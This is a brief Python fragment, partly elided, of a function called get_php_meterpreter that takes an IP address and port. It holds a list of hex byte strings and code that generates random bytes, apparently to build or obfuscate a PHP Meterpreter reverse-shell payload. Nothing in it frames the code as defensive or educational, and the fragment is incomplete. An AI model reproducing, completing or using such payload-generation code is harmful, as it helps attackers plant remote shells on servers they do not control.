...
def get_php_meterpreter(ip: str,port: int):
    ...
    l = [
        '\\x2a\\xc8\\xa4\\xae\\x79\\xe4\\x61\\x52\\x17\\x6a\\x04\\x65\\x48\\xd8',
        '\\x63\\xc3\\xfd\\xaa\\xd4\\x88\\xe6\\x62\\x23\\xe4\\x30\\xeb\\x7c\\x57',
        '\\xbf\\x92\\x49\\x29\\x33\\x54\\x61\\xcc\\x49\\xb9\\x5a\\xb6\\x16\\x0a',
        '\\x53\\x13\\x62\\x9b\\x91\\xdf\\x97\\x39\\x4a\\x48\\x59\\x47\\x15\\xfb',
        '\\xc6\\x7a\\x3d\\x67\\xaa\\x72\\xff\\x7b\\xa5\\xba\\xb6\\xb5\\xfa\\x09'
        ]
    e = '\\x' + hex(randint(0,255))[2:].zfill(2) + '\\x' + hex(randint(0,255))[2:].zfill(2)
